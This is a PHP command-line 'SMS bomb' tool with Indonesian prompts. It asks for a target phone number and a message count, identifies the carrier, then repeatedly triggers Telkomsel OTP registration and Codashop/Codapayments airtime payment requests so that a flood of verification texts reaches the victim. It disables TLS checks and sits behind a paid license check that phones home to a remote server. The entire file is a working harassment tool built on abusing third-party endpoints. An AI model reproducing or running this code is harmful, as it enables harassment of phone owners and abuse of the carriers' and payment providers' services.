<?php
function auto($action, $payload) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_URL, $action);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
	if(isset($payload)) {
		curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	}
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
function save($string, $path) {
	$fp = fopen($path, "w") or die(" \033[1;31m[!] Terjadi kesalahan perijinan storage!!!\033[1;33m\n");
	fwrite($fp, $string);
	fclose($fp);
}

echo "\n\033[1;32m/*       _\|/_
         (o o)
 +----oOO-{_}-OOo--------------------------------+
 |                                               |
 |          \033[1;35mTools Bom SMS All Operator\033[1;32m           |
 |                  \033[1;35mBy BullyHat\033[1;32m                  |
 |                                               |
 +----------------------------------------------*/\n\n";

$home_dir = $_SERVER['HOME'];
if (!is_dir($home_dir.'/.config')) {
    mkdir($home_dir.'/.config');
}
if (!is_dir($home_dir.'/.config/BomSMS')) {
    mkdir($home_dir.'/.config/BomSMS');
}
$file_hwid = $home_dir.'/.config/BomSMS/hwid';
$file_lisensi = $home_dir.'/.config/BomSMS/lisensi';
if(!file_exists($file_hwid)) {
	$hwid = substr(str_shuffle(str_repeat("0123456789ABCDEF", 12)), 0, 12);
	save($hwid, $home_dir.'/.config/BomSMS/hwid');
}else{
	$hwid = file_get_contents($home_dir.'/.config/BomSMS/hwid');
}
if(!file_exists($file_lisensi)) {
	echo " \033[1;31m[!] Maaf, \033[1;33m$hwid\033[1;31m belum memiliki lisensi.\n\033[1;32m";
	echo " \033[1;32m[\033[1;35m#\033[1;32m] Silahkan masukan lisensi anda!!!\n\033[1;32m";
	echo " \033[1;32m[\033[1;35m?\033[1;32m] Lisensi => \033[1;33m";
	$lisensi = trim(fgets(STDIN));
	if(isset($lisensi)) {
		save($hwid, $home_dir.'/.config/BomSMS/lisensi');
	}else{
      exit;
    }
}else{
	$lisensi = file_get_contents($file_lisensi);
}
$chk_lisensi = file_get_contents("http://tools.cloudaccess.host/BomSMS.php?hwid=$hwid&lisensi=$lisensi");
if($chk_lisensi == "valid") {
	echo " \033[1;32m[\033[1;35m?\033[1;32m] Nomor Target => \033[1;33m";
	$nomer = trim(fgets(STDIN));
	if($nomer == "" || !is_numeric($nomer)) {
      exit;
	}
	if(substr($nomer, 0, 1) === '0') {
		$nomer = '0' . substr($nomer, 1);
		$number = '' . substr($nomer, 1);
	}else if(substr($nomer, 0, 2) === '62') {
		$nomer = '0' . substr($nomer, 2);
		$number = '' . substr($nomer, 2);
	}
	echo " \033[1;32m[\033[1;35m?\033[1;32m] Jumlah Spam => \033[1;33m";
	$jumlah = trim(fgets(STDIN));
	$chk_op = json_decode(auto("https://www.hlrlookup.com/actions.php", "in_msisdn=62$number&action=validatenumber"), true);
	$operator = $chk_op['original_network_name'];
	$code = json_decode(file_get_contents("http://tools.cloudaccess.host/pay_code_codashop.json"), true);
	if($operator == 'Telkomsel') {
		$pay_code = $code['Telkomsel'];
	}else if($operator == 'IM3') {
		$pay_code = $code['Indosat'];
	}else if(in_array($operator, array('3', 'Hutchison'), true)) {
		$pay_code = $code['3'];
	}else if(in_array($operator, array('XL', 'AXIS'), true)) {
		$pay_code = $code['XL'];
	}else{
		die(" \033[1;31m[!] Cuma Suppport All GSM Indonesia Bosquh!!!\033[1;33m\n");
	}
	for($a=0;$a<$jumlah;$a++) {
		if($operator == 'Telkomsel') {
			auto("https://www.telkomsel.com/prepaid_registration/get_otp", "phone=$nomer", null);
		}else{
			$order_date = urlencode(gmdate('m/j/Y-Gi', time()+7*3600)); 
			$order = json_decode(auto("https://www.codashop.com/initPayment.action", "voucherPricePoint.id=$pay_code&voucherPricePoint.price=0&voucherPricePoint.variablePrice=0&email=admin%40gmail.com&n=$order_date&userVariablePrice=0"), true);
			$txnId = $order['txnId'];
			if(empty($txnId)) {
				die(" \033[1;31m[!] Terjadi kesalahan server, silahkan kontak pembuat!!!\033[1;33m\n");
			}
			$mcr_now = microtime(true);
			auto("https://airtime.codapayments.com/airtime/msisdn", "TxnId=$txnId&browser_type=mobile-web&MnoId=0&input_phone_number=$nomer");
			if(in_array($operator, array('IM3', 'AXIS', 'XL'), true)) {
				auto("https://airtime.codapayments.com/airtime/isconfirm?msisdn=$number&TxnId=$txnId&date=$mcr_now", null);
			}
		}
		$no = $a+1;
		print "     \033[1;32m[\033[1;35m$no\033[1;32m] Sukses Mengirim Spam Ke \033[1;35m$nomer \033[1;32m√\n\033[1;32m";
	}
}else{
	unlink($file_lisensi);
	die("\033[1;31m[!] Lisensi anda salah, silahkan hubungi WA +18544444197!!!\033[1;33m\n");
}
